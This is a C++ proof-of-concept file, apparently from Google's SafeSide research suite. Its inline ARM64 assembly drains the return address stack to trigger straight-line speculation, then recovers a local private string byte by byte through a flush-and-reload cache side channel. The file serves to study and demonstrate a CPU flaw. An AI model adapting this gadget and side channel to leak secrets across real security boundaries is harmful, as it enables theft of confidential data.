/*
 * Copyright 2019 Google LLC
 *
 * Licensed under both the 3-Clause BSD License and the GPLv2, found in the
 * LICENSE and LICENSE.GPL-2.0 files, respectively, in the root directory.
 *
 * SPDX-License-Identifier: BSD-3-Clause OR GPL-2.0
 */

// Straight-Line Speculation (SLS) via RAS underflow on ARM64.
//
// The gadget drains the Return Address Stack (RAS) with 32 `ret`
// instructions, then executes a final `ret` that underflows. The CPU
// falls back to BTB prediction, potentially speculating past the `ret`
// into dead code that leaks a secret byte into the cache.

#include <cstring>
#include <iostream>

#include "cache_sidechannel.h"
#include "compiler_specifics.h"
#include "local_content.h"

// Naked gadget: RAS drain + SLS trigger + dead code.
//
// x0 = data, x1 = offset, x2 = oracle, x6 = return address
SAFESIDE_NEVER_INLINE
__attribute__((naked))
static void SlsGadget() {
  asm volatile(
      // Phase 1: drain RAS (32 iterations)
      "mov x4, #32\n"
      "adr x5, 1f\n"
      "0:\n"
      "  mov x30, x5\n"
      "  ret\n"
      "1:\n"
      "  subs x4, x4, #1\n"
      "  b.ne 0b\n"

      // Phase 2: SLS trigger (RAS empty -> BTB fallback)
      "mov x30, x6\n"
      "ret\n"

      // Dead code (speculative only)
      "ldrb w3, [x0, x1]\n"
      "lsl x3, x3, #12\n"
      "add x3, x3, x2\n"
      "ldrb w3, [x3]\n"
      "ret\n"
  );
}

// Enter gadget via ADR+BR (no RAS push).
SAFESIDE_NEVER_INLINE
static void TriggerSls(const char *data, size_t offset,
                       const void *oracle) {
  register const char *r0 asm("x0") = data;
  register size_t r1 asm("x1") = offset;
  register const void *r2 asm("x2") = oracle;
  register const void *gadget asm("x3") =
      reinterpret_cast<const void *>(SlsGadget);

  asm volatile(
      "mov x7, x30\n"
      "adr x30, 1f\n"
      "mov x6, x30\n"
      "br x3\n"
      "1:\n"
      "mov x30, x7\n"
      :
      : "r"(gadget), "r"(r0), "r"(r1), "r"(r2)
      : "x4", "x5", "x6", "x7", "memory", "cc"
  );
}

static char LeakByte(size_t offset) {
  CacheSideChannel sidechannel;
  const std::array<BigByte, 256> &oracle = sidechannel.GetOracle();

  for (int run = 0;; ++run) {
    sidechannel.FlushOracle();
    size_t safe_offset = run % strlen(public_data);
    TriggerSls(public_data, offset, oracle.data());

    std::pair<bool, char> result =
        sidechannel.RecomputeScores(public_data[safe_offset]);
    if (result.first) {
      return result.second;
    }

    if (run > 100000) {
      std::cerr << "Does not converge " << result.second << std::endl;
      exit(EXIT_FAILURE);
    }
  }
}

int main() {
  std::cout << "Leaking the string: ";
  std::cout.flush();
  const size_t private_offset = private_data - public_data;
  for (size_t i = 0; i < strlen(private_data); ++i) {
    std::cout << LeakByte(private_offset + i);
    std::cout.flush();
  }
  std::cout << "\nDone!\n";
}
